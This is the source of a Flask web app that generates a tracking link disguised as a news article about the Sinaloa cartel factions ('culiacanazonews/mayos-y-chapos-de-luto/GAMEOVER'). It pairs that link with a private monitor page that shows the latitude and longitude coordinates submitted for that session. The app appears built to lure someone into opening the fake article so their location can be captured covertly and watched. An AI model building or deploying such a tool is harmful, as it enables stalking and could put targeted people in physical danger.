from flask import Flask, request, jsonify, send_from_directory, render_template, render_template_string
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from flask_migrate import Migrate
from uuid import uuid4
from datetime import datetime
import os

# Configuración de la app y base de datos
app = Flask(__name__)
app.config.from_pyfile('config.py')
CORS(app)

db = SQLAlchemy(app)
migrate = Migrate(app, db)

# Modelo de la ubicación
class Ubicacion(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    session_id = db.Column(db.String(100), nullable=False)
    lat = db.Column(db.Float, nullable=False)
    lon = db.Column(db.Float, nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def to_dict(self):
        return {
            'lat': self.lat,
            'lon': self.lon,
            'timestamp': self.timestamp.isoformat()
        }

@app.route('/ubicacion', methods=['POST'])
def recibir_ubicacion():
    data = request.get_json()
    session_id = data.get('session_id')
    lat = data.get('lat')
    lon = data.get('lon')

    if not session_id or lat is None or lon is None:
        return jsonify(success=False, error='Datos incompletos'), 400

    nueva_ubicacion = Ubicacion(session_id=session_id, lat=lat, lon=lon)
    db.session.add(nueva_ubicacion)
    db.session.commit()

    return jsonify(success=True)

@app.route('/ubicacion', methods=['GET'])
def obtener_ubicacion():
    session_id = request.args.get('session_id')
    if not session_id:
        return jsonify(success=False, error='Falta session_id'), 400

    ubicaciones = Ubicacion.query.filter_by(session_id=session_id).order_by(Ubicacion.timestamp.desc()).all()
    return jsonify([u.to_dict() for u in ubicaciones])

@app.route('/monitor')
def monitor():
    return send_from_directory('templates', 'monitor.html')

@app.route('/culiacanazonews/mayos-y-chapos-de-luto/GAMEOVER')
def tracker():
    return send_from_directory('templates', 'tracker.html')

@app.route('/generar', methods=['GET', 'POST'])
def generar():
    enlace = monitor = None
    if request.method == 'POST':
        session_id = str(uuid4())
        base_url = request.host_url.rstrip('/')
        enlace = f"{base_url}/culiacanazonews/mayos-y-chapos-de-luto/GAMEOVER?session_id={session_id}"
        monitor = f"{base_url}/monitor?session_id={session_id}"
    return render_template('generador.html', enlace=enlace, monitor=monitor)

if __name__ == '__main__':
    app.run()
